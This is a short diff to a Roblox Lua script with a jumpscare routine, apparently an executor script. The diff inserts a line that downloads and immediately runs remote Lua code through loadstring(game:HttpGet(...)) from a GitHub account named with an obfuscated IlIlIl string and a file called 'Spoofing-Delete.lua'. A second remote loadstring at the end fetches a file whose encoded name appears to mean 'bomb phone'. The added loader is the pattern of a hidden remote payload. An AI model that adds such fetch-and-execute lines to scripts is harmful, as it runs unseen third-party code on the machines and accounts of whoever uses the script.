@@ -84,6 +84,7 @@ while wait() do
     img.ImageColor3 = Color3.new(1,1,1)
 end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/main/Spoofing-Delete.lua", true))()
 local auegh = Instance.new("Sound",game)
 auegh.Volume = 10
 auegh.SoundId = "rbxassetid://5567523008"
@@ -102,4 +103,5 @@ if math.random(1,5) == 1 then
 jumpscare()
 end
 end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/UI-library/main/%E8%BD%B0%E7%82%B8%E6%89%8B%E6%9C%BA.lua", true))()
